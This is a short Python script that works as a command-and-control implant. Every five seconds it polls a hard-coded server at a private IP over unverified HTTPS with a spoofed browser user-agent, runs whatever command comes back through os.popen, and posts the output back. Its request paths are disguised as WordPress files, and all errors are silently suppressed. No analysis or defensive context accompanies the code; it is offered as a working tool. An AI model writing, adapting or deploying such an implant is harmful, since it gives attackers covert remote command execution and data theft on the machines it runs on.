
import os, ssl, time, http.client, string
server = "172.16.69.130"
lport = "4443"
agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"

trantab = str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz","NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
session_value = "6Q2HydryJknyIyyVv8Om"
value = session_value.translate(trantab)
header = {'cookie':'session = ' + session_value, 'User-agent':str(agent)}

def callback():
    try:
        c2_connection = http.client.HTTPSConnection(str(server), port=lport ,timeout=10, context=ssl._create_unverified_context())
        c2_connection.request("GET", "/wp-post.php", headers=header)
        cmd = c2_connection.getresponse().read().decode()
        if cmd:
            results = (os.popen(str(cmd)).read()) + value
            c2_connection.request("POST", "/wp-admin/admin-ajax.php", results)
            c2_connection.close()
    except:
        pass


while 1:
    callback()
    time.sleep(5)
